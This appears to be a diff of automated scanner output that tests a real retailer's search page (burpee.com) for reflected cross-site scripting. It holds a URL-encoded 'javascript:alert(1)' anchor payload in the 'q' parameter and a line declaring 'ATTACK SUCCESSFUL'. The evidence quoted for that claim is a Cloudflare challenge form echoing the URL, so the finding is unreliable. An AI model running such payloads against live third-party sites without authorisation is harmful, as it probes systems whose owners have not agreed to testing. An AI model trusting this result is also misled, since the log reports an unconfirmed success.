@@ -1,4 +1,4 @@
-https://www.burpee.com/gardening-supplies/
+https://www.burpee.com/vegetables/turnips/turnip-silky-sweet-hybrid--prod500775.html
 
 GET Params:[1]
 ['q']
@@ -77,4 +77,4 @@ URL Attack Url: https://www.burpee.com/search?q=%3Ca+href%3D%22jaVaScripT%3AAleR
 
 => ATTACK SUCCESSFUL with Payload: %3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E
 Detection of Payload: 
-<form class="challenge-form" id="challenge-form" action="/search?q=%3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E&amp;__cf_chl_captcha_tk__=cdf9320b31714eee1c3f2cabc13cbfe43b30bfbb-1586151419-0-AcOTaFSqy9ek-zRJCJWFZ2NN4OUiGS8U-_yPb-xkY9QnzRDp7PCcMm1GsTF90NeA9Bw6LAzj-7yR-Hx6j0qhpOSWSjtxJeYD6T66q7qLmK6kKCAynL2Zi0r4XIwHisdneMHFIrzyoK5Z3MH5hl8p44jElOg3L40ARezN51sZFJJOThmFavWXU93Y_esCG6GaLWL1rkBqMFu_3uH7tBwriYdvKV_byKPHt4Rd6-rWOzOiXtvvpQVUTS3jMnMlCakPPd18V2-NG03D5TwlufUc9sDhMNKkeKTWPBMZHbYU8R9GFJtoR59w1ZLx0SRBEpBcxWZJ9UluMu9Q9Ix1j5R6gKl0J490BxaRPdmOFJtbEjEkjBJn2JKsAxKqzHrlsRNZeVjZ0VYYGQaf-dJUBaSNX61OZnCgbYdFBtySvy3rP-sGh-tpB2Ta9W-KCD5P2w9EBO0c7l06YFN8wnF4I35lhfWT0t1oKuuXTsGCeMJcNEnloSd4dn0NXkl-eLBJ9DRiotzacMhYAJapA17z445UyiOv07EQk5lbBbqtIXZiy8MQMaBY4GMqFHP2oCIX6X_3ki3GkddSn2-aBRn9A6VMIWQ" method="POST" enctype="application/x-www-form-urlencoded">
+<form class="challenge-form" id="challenge-form" action="/search?q=%3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E&amp;__cf_chl_captcha_tk__=85c729e0aeb3afde8caaab6f08771e97a67e4cd5-1586151490-0-ASX7Ffkq177lnw8cAtbXDipwB9RLgn3yl1hzGZ8VhS0ERo0yXvC8rPgELL8MDoqfMAmMRJ_NOPFPvthyQW2L9qUbMXJd4iTPvCFnQFbpanYN8sMW-7TEhbcP-mYVcPi3x_4qNYEFWDIjK6ymR5bpumwf_vu5eWqoJZI9qMNO29scAzG_pljpwB0TDH0tbANIj11Wuyp7SOklrJ1mjqDIOYN67TYFrNtsEcidZsdDKzy-CqqmRAjWetRmuaPj1zVegkxWJJltxfEd7YD_-5pobHBuMsiaM_uDWTVWJR9bKNXhk-W2Dxjc3k7Z92TfiyVUdZmhyOh9mi0ciBQIJEzcLFafwNYbMq-QScj5dApn3bSiNKEs6tRJGA5S1cbgjQCojnNlLCTgcNh_oWgA_oEGpouMdeWBRgFwlzLpJ2wV4UKRpgnuVpGmkpz3BMRSx0ub2JR8CeDxHtpnNBVOf-1PbTN0Y9hehvRdyNYIpjAW7ygCS0bbkXVKkERBjA_HMO1SNGnZ3EY98hMKrTG7bhgFguB7zCSdcYKlt9oNufO2BOT__i9Wmz5H0lDADwONKLU1XGV6SxJcOemrysyME0Lc3hI" method="POST" enctype="application/x-www-form-urlencoded">
